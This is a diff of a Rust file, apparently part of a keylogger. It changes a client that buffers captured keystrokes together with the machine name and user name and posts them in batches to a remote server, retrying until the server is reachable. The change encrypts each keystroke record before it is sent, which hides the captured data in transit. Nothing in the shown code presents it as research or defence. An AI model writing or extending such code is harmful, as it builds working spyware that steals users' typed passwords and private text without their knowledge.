@@ -3,6 +3,7 @@ use serde_json::json;
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use std::thread;
+use crate::crypto;
 
 /// Intervalo de envío en segundos (cada 30 segundos)
 const SEND_INTERVAL_SECONDS: u64 = 30;
@@ -31,10 +32,7 @@ impl ApiClient {
             api_available: Arc::new(Mutex::new(false)),
         };
 
-        // Iniciar el hilo que verifica la API periódicamente
         client.start_health_checker();
-
-        // Iniciar el hilo que envía periódicamente
         client.start_periodic_sender();
 
         client
@@ -56,13 +54,12 @@ impl ApiClient {
             loop {
                 let available = client.check_api_health();
 
-                // Usar un bloque para liberar el MutexGuard automáticamente
                 {
                     let mut status = client.api_available.lock().unwrap();
                     if available && !*status {
                         println!("✅ API disponible! Enviando buffer acumulado...");
                         *status = true;
-                        drop(status); // Liberar explícitamente antes de flush
+                        drop(status);
                         let _ = client.flush();
                     } else if !available && *status {
                         println!("⚠️ API no disponible, esperando reconexión...");
@@ -70,7 +67,6 @@ impl ApiClient {
                     } else if !available {
                         println!("⏳ API no disponible, reintentando en {} segundos...", RETRY_INTERVAL_SECONDS);
                     }
-                    // El MutexGuard se libera aquí al salir del bloque
                 }
 
                 thread::sleep(Duration::from_secs(RETRY_INTERVAL_SECONDS));
@@ -78,24 +74,45 @@ impl ApiClient {
         });
     }
 
-    /// Agrega una tecla al buffer (no envía inmediatamente)
+    /// Agrega una tecla al buffer (cifrada)
     pub fn add_key(&self, key: &str, timestamp: &str) -> Result<(), Box<dyn std::error::Error>> {
+        println!("📝 add_key() - key: '{}'", key);
+
         let machine = hostname::get()?.to_string_lossy().to_string();
         let user = std::env::var("USER")
             .or_else(|_| std::env::var("USERNAME"))
             .unwrap_or_else(|_| "unknown".to_string());
 
-        let entry = json!({
+        // 1. Crear el payload en texto plano
+        let plaintext = json!({
             "key": key,
             "timestamp": timestamp,
             "machine": machine,
             "user": user,
         });
 
+        // 2. Convertir a string y CIFRAR
+        let plaintext_str = plaintext.to_string();
+        println!("📝 Texto plano a cifrar: {}", plaintext_str);
+
+        let encrypted = match crypto::encrypt(&plaintext_str) {
+            Ok(e) => {
+                println!("✅ Cifrado exitoso - longitud: {}", e.len());
+                e
+            }
+            Err(e) => {
+                eprintln!("❌ Error cifrando: {}", e);
+                return Err(e);
+            }
+        };
+
+        // 3. Guardar el dato cifrado en el buffer
+        let entry = json!({ "data": encrypted });
+
         let mut buffer = self.buffer.lock().unwrap();
         buffer.push(entry);
+        println!("📊 Buffer actual: {} teclas", buffer.len());
 
-        // Verificar si la API está disponible antes de enviar
         let api_available = *self.api_available.lock().unwrap();
         if buffer.len() >= MAX_BUFFER_SIZE && api_available {
             drop(buffer);
@@ -113,23 +130,24 @@ impl ApiClient {
             return Ok(());
         }
 
-        // Verificar si la API está disponible
         let api_available = *self.api_available.lock().unwrap();
         if !api_available {
             println!("⏳ API no disponible, buffer retenido ({} teclas)", buffer.len());
             return Ok(());
         }
 
+        // IMPORTANTE: Antes de enviar, mostramos lo que vamos a enviar
         let data: Vec<serde_json::Value> = buffer.drain(..).collect();
         let count = data.len();
 
-        println!("📤 Enviando {} teclas al servidor...", count);
+        println!("📤 Enviando {} teclas cifradas al servidor...", count);
+        println!("📤 Primera tecla cifrada: {}", data[0]["data"].as_str().unwrap_or("VACÍO"));
 
         let url = format!("{}/api/keys/batch", self.base_url);
         match self.client.post(&url).json(&data).send() {
             Ok(response) => {
                 if response.status().is_success() {
-                    println!("✅ {} teclas enviadas correctamente", count);
+                    println!("✅ {} teclas cifradas enviadas correctamente", count);
                 } else {
                     eprintln!("⚠️ Error HTTP: {}", response.status());
                     for item in data {
@@ -142,7 +160,6 @@ impl ApiClient {
                 for item in data {
                     buffer.push(item);
                 }
-                // Marcar API como no disponible
                 let mut status = self.api_available.lock().unwrap();
                 *status = false;
             }
